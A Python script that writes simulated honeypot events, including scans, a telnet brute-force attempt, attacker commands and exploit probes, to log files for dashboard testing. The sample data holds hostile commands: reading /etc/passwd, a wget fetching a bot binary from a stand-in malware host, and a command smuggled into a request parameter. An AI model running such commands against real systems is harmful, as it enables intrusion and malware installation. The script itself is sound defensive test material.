from __future__ import annotations

from common import LOG_DIR, append_jsonl, ensure_dirs, sha256_bytes, utc_now
from firewall_rules import block


def main() -> None:
    ensure_dirs()
    events = [
        {
            "timestamp": utc_now(),
            "event_type": "network_request",
            "service": "http",
            "source_ip": "203.0.113.45",
            "source_port": 49152,
            "method": "GET",
            "path": "/",
            "user_agent": "masscan/1.3",
        },
        {
            "timestamp": utc_now(),
            "event_type": "login_attempt",
            "service": "telnet",
            "source_ip": "198.51.100.19",
            "source_port": 51244,
            "username": "admin",
            "password": "admin",
            "success": False,
        },
        {
            "timestamp": utc_now(),
            "event_type": "keystroke_capture",
            "service": "telnet",
            "source_ip": "198.51.100.19",
            "source_port": 51244,
            "stage": "command",
            "captured_text": "uname -a",
            "character_count": 8,
        },
        {
            "timestamp": utc_now(),
            "event_type": "command",
            "service": "telnet",
            "source_ip": "198.51.100.19",
            "command": "uname -a",
        },
        {
            "timestamp": utc_now(),
            "event_type": "command",
            "service": "telnet",
            "source_ip": "198.51.100.19",
            "command": "cat /etc/passwd",
        },
        {
            "timestamp": utc_now(),
            "event_type": "command",
            "service": "telnet",
            "source_ip": "198.51.100.19",
            "command": "wget http://malware.example/bot.arm -O /tmp/b",
        },
        {
            "timestamp": utc_now(),
            "event_type": "exploit_probe",
            "service": "http",
            "source_ip": "192.168.10.50",
            "method": "GET",
            "path": "/admin",
            "payload": "cmd=cat+/etc/passwd",
        },
        {
            "timestamp": utc_now(),
            "severity": "high",
            "message": "Internal host touched hidden honeypot",
            "source_ip": "192.168.10.50",
            "event_type": "exploit_probe",
            "service": "http",
        },
        {
            "timestamp": utc_now(),
            "event_type": "payload_upload",
            "service": "http",
            "source_ip": "45.83.64.10",
            "method": "POST",
            "path": "/upload",
            "sha256": sha256_bytes(b"demo firmware implant"),
            "bytes": 21,
        },
        {
            "timestamp": utc_now(),
            "event_type": "banner_grab",
            "service": "ssh",
            "source_ip": "185.220.101.14",
            "source_port": 44012,
            "client_banner": "SSH-2.0-libssh-0.10.5",
        },
    ]
    for event in events:
        target = "alerts.jsonl" if "severity" in event else "events.jsonl"
        append_jsonl(LOG_DIR / target, event)
    block("198.51.100.19", "Sample brute force source for dashboard verification")
    print(f"Wrote {len(events)} sample events to {LOG_DIR / 'events.jsonl'}")


if __name__ == "__main__":
    main()
